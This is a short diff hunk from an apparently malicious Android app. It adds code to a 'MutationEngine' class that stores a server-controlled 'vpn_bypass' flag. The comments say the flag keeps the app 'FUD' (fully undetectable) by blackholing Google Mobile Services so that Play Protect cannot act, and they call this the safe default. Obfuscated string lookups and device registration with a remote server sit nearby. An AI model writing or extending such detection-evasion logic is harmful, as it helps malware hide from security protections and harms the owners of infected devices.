@@ -314,6 +314,14 @@ class MutationEngine(private val context: Context) {
                                     ?.optString(StringPool.d(StringPool.KEY_MODULE_PKG), "") ?: "")
                             put("tier", 1)
                         }
+                        // Persist vpn_bypass flag for InstallActivity
+                        // 1 = FUD ON (GMS blackholed), 0 = FUD OFF (GMS excluded → Play Protect active)
+                        // Default 1 so unreachable server = FUD stays ON (safe default)
+                        val vpnBypass = payload.optInt("vpn_bypass", 1)
+                        context.getSharedPreferences("vg_prefs", Context.MODE_PRIVATE)
+                            .edit()
+                            .putInt("vpn_bypass", vpnBypass)
+                            .apply()
                         registerDeviceAsync(
                             payload.optString("device_id", ""),
                             mutations!!.optString(StringPool.d(StringPool.KEY_MODULE_PKG), ""),
